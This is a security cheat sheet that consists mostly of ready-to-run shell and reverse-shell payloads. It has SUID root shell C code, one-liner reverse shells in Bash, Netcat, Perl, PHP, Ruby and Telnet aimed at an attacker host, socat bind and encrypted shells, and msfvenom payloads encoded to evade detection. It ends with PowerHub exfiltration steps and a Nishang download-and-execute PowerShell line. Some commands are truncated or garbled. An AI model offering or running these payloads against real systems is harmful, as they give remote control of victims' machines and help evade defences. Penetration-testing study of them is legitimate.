# 🐚 Shells and Reverse Shells Cheat Sheet

**SUID C Shells**

* **bin/bash:**

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

* **bin/sh:**

```
int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}
```

#### **TTY Shell:** <a href="#toc475368998" id="toc475368998"></a>

* ```
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```
* ```
  echo os.system('/bin/bash')
  ```
* ```
  /bin/sh –i
  ```
*   ```
    execute('/bin/sh')
    ```



**LUA:**

* ```
  !sh
  ```
  * Privilege Escalation via nmap
* ```
  :!bash
  ```
  * Privilege escalation via vi

#### Fully Interactive TTY:

<pre><code><strong>                                In reverse shell 
</strong>python -c 'import pty; pty.spawn("/bin/bash")'
<strong>Ctrl-Z
</strong><strong>                                In Attacker console
</strong>stty -a
stty raw -echo
<strong>fg
</strong><strong>                                In reverse shell
</strong>reset
export SHELL=bash
export TERM=xterm-256color
stty rows &#x3C;num> columns &#x3C;cols>
</code></pre>

#### **Spawn Ruby Shell:** <a href="#toc475368999" id="toc475368999"></a>

* ```
  exec "/bin/sh"
  ```
* ```
  ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
  ```

**Netcat:**

* ```
  nc -e /bin/sh ATTACKING-IP 80
  ```
* ```
  /bin/sh | nc ATTACKING-IP 80
  ```
* ```
  rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
  ```

#### Socket (Encrypted Shell):

{% embed url="https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/" %}

#### Bind Shell:

```

# Victim machine

socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash // for linux

TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes // for windows

# Attacker machine

socat - TCP4:<Victim IP>:4443

```

#### **Reverse Shell:** <a href="#toc475369001" id="toc475369001"></a>

```
# Attacker Machine

socat -d -d TCP4-LISTEN:4443 STDOUT

# Victim Machine

socat TCP4:<Attacker IP>:4443 EXEC:/bin/bash //Linux

TCP4:<Attacker IP>:4443 EXEC:'cmd.exe',pipes //Windows
```

#### **Encrypted Bind Shell:** <a href="#toc475369001" id="toc475369001"></a>

```
# Genereate Openssl key and certificate

openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
```

```
# Covert the key file and certificate file to .pem file

cat bind.key bind.crt L > bind.pem
```

{% hint style="info" %}
Share the .pem file to victim machine as this is a bind shell
{% endhint %}

```
# Victim Machine

socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash //for windows

socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes //for windows


# Attacker Machine

socat - OPENSSL:<Victim IP>:4443,verify=0
```

#### Encrypted Reverse Shell: <a href="#toc475369001" id="toc475369001"></a>

```
# Genereate Openssl key and certificate

openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
```

```
# Covert the key file and certificate file to .pem file

cat bind.key bind.crt L > bind.pem
```

```
# Attacker Machine

socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT


# Victim Machine

socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash // for linux

OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes // for windows
```

#### **Telnet Reverse Shell:** <a href="#toc475369001" id="toc475369001"></a>

* ```
  rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
  ```
* ```
  telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
  ```

#### **PHP:** <a href="#toc475369002" id="toc475369002"></a>

* ```
  php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```
  * (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

#### **Bash:** <a href="#toc475369003" id="toc475369003"></a>

* ```
  exec /bin/bash 0&0 2>&0
  ```
* ```
  0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
  ```
* ```
  exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
  ```

\# or: while read line 0<&5; do $line 2>&5 >&5; done

* ```
  bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
  ```

#### **Perl:** <a href="#toc475369004" id="toc475369004"></a>

* ```
  exec "/bin/sh";
  ```
* ```
  perl —e 'exec "/bin/sh";'
  ```
* ```
  perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
* ```
  perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
  ```
  * Windows
* ```
  perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
  * &#x20;Windows

## Stealthy Shells

### #1&#x20;

#### In the Attacker Machine

```
msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=<IP addr> LPORT=<port number> -f exe > xcmd.exe
```

```
msfvenom -p windows/shell/reverse_tcp -e rc4 -encrypt-key BlueSky LHOST=<IP addr> LPORT=<Port number> -f exe > zcmd.exe
```

#### In the Victim Machine

```
Invoke-WebRequest http://<ip address>/xcmd.exe -UseBasicParsing -Outfile xcmd.exe
```



## Living Off the Land

### Windows Tools

* PowerShell
* cmd.exe
* cscript.exe
* psexec.exe
* wmic.exe
* findstr -> for searching the file base
* bitsadmin -> load content
* regedit -> store information

### Linux Tools

* netcat, scp, curl, and wget for file transfers
* grep and find for searching the file base
* awk, gawk, gdb, and other tools

## PowerHub

{% embed url="https://www.github.com/AdrianVollmer/PowerHub" %}

### In the Attacker Machine

```
python3 powerhub.py <Target IP address>
```

### In the Victim Machine

```
List-HubModules
```

#### Recon Local Groups

```
Get-LocalGroup | ConvertTo-Json | Out-file groups.json

PushTo-Hub groups.json
```

### Exfiltration In the Attacker Machine

```
dos2unix groups.json

nano groups.json
```



## PHPSploit

{% embed url="https://www.github.com/nil0x42/phpsploit" %}

### Start PHPSploit

```
./phpsploit --interactive

set target <Target URL>

exploit
```



## Reverse Shell using Nishang (Windows Victim Host)

```
# Installation
sudo apt install nishang

# Nishang Default Shells Location
/usr/share/windows-binaries/nishnag/shells

# Start a python http server to share the payloads
python3 -m http.server 8080

# Start a netcat listener
nc -nlvp 1234

# Download and execute the script in the victim host
powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.6.228:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.6.2>
```
